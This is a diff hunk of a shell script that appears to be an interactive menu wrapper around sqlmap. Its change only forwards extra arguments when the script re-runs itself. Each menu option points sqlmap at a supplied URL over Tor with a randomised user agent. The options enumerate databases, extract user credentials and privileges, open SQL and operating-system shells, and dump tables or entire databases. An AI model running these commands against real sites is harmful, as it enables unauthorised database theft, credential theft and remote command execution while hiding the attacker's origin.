@@ -54,15 +54,15 @@
 	read choice
 	# Execute the right operation based on the choice of the user
 	case "$choice" in
-		1) sqlmap -u $1 --random-agent --level=$l --risk=$r -b --dbs --table --tor;echo "Vulnerability check done\n\nPress any key to continue";read tasto;$0 $1;;
-		2) sqlmap -u $1 --random-agent --level=$l --risk=$r -b --users --passwords --privileges --tor;echo "\nRetrieving credentials and privileges done\n\nPress any key to continue";read tasto;$0 $1;;
-		3) sqlmap -u $1 --random-agent --level=$l --risk=$r -b --sql-shell --tor;echo "\nSQL Shell closed\n\nPress any key to continue";read tasto;$0 $1;;
-		4) sqlmap -u $1 --random-agent --level=$l --risk=$r -b --os-shell --tor;echo "\nOS Shell closed\n\nPress any key to continue";read tasto;$0 $1;;
-		5) echo "\nTable name: "; read tabella; sqlmap -u $1 --random-agent --level=$l --risk=$r -b --dump -T $tabella --tor;echo "\nDump of the table '$tabella' done\n\nPress any key to continuee";read tasto;$0 $1;;
-		6) echo "\nDatabase name: "; read database; sqlmap -u $1 --random-agent --level=$l --risk=$r -b --dump -D $database --tor;echo "\nDump of the database '$database' done\n\nPress any key to continue";read tasto;$0 $1;;
-		7) sqlmap -u $1 --random-agent  --level=$l --risk=$r -b --dump-all --tor;echo "\nDump of all databases done\n\nPress any key to continue";read tasto;$0 $1;;
-		8) sudo sqlmap --update; echo "Update done\nPress any key to continue";read tasto;$0 $1;;
+		1) sqlmap -u $1 --random-agent --level=$l --risk=$r -b --dbs --table --tor;echo "Vulnerability check done\n\nPress any key to continue";read tasto;$0 $1 $2 $3 $4 $5;;
+		2) sqlmap -u $1 --random-agent --level=$l --risk=$r -b --users --passwords --privileges --tor;echo "\nRetrieving credentials and privileges done\n\nPress any key to continue";read tasto;$0 $1 $2 $3 $4 $5;;
+		3) sqlmap -u $1 --random-agent --level=$l --risk=$r -b --sql-shell --tor;echo "\nSQL Shell closed\n\nPress any key to continue";read tasto;$0 $1 $2 $3 $4 $5;;
+		4) sqlmap -u $1 --random-agent --level=$l --risk=$r -b --os-shell --tor;echo "\nOS Shell closed\n\nPress any key to continue";read tasto;$0 $1 $2 $3 $4 $5;;
+		5) echo "\nTable name: "; read tabella; sqlmap -u $1 --random-agent --level=$l --risk=$r -b --dump -T $tabella --tor;echo "\nDump of the table '$tabella' done\n\nPress any key to continuee";read tasto;$0 $1 $2 $3 $4 $5;;
+		6) echo "\nDatabase name: "; read database; sqlmap -u $1 --random-agent --level=$l --risk=$r -b --dump -D $database --tor;echo "\nDump of the database '$database' done\n\nPress any key to continue";read tasto;$0 $1 $2 $3 $4 $5;;
+		7) sqlmap -u $1 --random-agent  --level=$l --risk=$r -b --dump-all --tor;echo "\nDump of all databases done\n\nPress any key to continue";read tasto;$0 $1 $2 $3 $4 $5;;
+		8) sudo sqlmap --update; echo "Update done\nPress any key to continue";read tasto;$0 $1 $2 $3 $4 $5;;
 		9) echo "\nBye bye =)\n"; exit 0;;
 		q) echo "\nBye bye =)\n"; exit 0;;
-		*) echo "Not valid command\nPress any key to continue";read tasto;$0 $1;;
+		*) echo "Not valid command\nPress any key to continue";read tasto;$0 $1 $2 $3 $4 $5;;
 	esac
